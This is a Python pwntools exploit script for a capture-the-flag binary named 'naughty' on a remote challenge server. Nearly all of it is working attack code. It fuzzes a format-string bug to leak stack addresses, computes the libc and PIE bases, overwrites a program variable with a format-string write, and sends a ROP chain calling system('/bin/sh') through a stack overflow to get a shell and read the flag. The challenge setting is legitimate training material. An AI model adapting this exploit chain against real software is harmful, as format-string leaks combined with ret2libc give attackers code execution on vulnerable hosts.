#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './naughty'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'challs.airoverflow.com', 33277

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec naughty
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'.'

def fuzz():
    context.log_level = 'warning'
    for idx in range(1, 50+1):
        io = initialize()

        io.sendlineafter(b'>>', b'3')
        io.sendlineafter(b'index:', b'0')
        io.sendlineafter(b'name:', f'%{idx}$p'.encode())

        io.sendlineafter(b'>>', b'2')
        io.sendlineafter(b'index:', b'0')
        io.recvuntil(b'Name: ')

        leak = io.recvline().strip()
        log.warning(f'[{idx}] => {leak}')

        io.close()

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'index:', b'0')
    io.sendlineafter(b'name:', b'%35$p||%19$p')

    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b'index:', b'0')
    io.recvuntil(b'Name: 0x')
    
    libc.address = int(io.recvuntil(b'||0x', drop=True), 16) - 0x29d90
    elf.address = int(io.recvline(), 16) - 0x1927
    
    payload = fmtstr_payload(8, {
        elf.sym['written']  : 0x0 
    })

    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b'index:', b'1')
    io.sendlineafter(b'name:', payload)

    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b'index:', b'1')

    payload = flat({
        88: [
            elf.address + 0x19d3, # pop rdi; ret;
            next(libc.search(b'/bin/sh\x00')),
            elf.address + 0x101a, # ret;
            libc.sym['system'],
        ]
    })
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'name:', payload)

    io.sendline(b'cat flag*')

    log.success('libc base: %#x', libc.address)
    log.success('elf base: %#x', elf.address)
    io.interactive()
    
if __name__ == '__main__':
    # fuzz()
    exploit()